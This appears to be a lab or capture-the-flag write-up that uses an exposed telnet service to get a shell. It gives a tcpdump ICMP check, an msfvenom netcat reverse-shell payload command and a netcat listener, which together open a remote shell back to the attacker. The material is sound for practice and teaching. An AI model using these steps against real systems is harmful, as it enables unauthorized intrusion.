---
description: tcpdump listener
---

# 🔼 tools used

with the OpenVPN connection:

* `sudo tcpdump ip proto \\icmp -i tun0`

<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption><p>why tun0</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

in order to find if telnet is executing our commands on it we started a tcpdump listener on our local machine and then executed `.RUN ping [our local ip] -c 1`

***

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:\


`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

`-p` = payload

`lhost` = our local host IP address (this is your machine's IP address)

`lport` = the port to listen on (this is the port on your machine)

`R` = export the payload in raw format

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

#### Now all we need to do is start a netcat listener on our local machine. We do this using:

`nc -lvp [listening port]`

after that we copy and paste our msfvenom payload into the telnet session and run it as a command to get a shell.
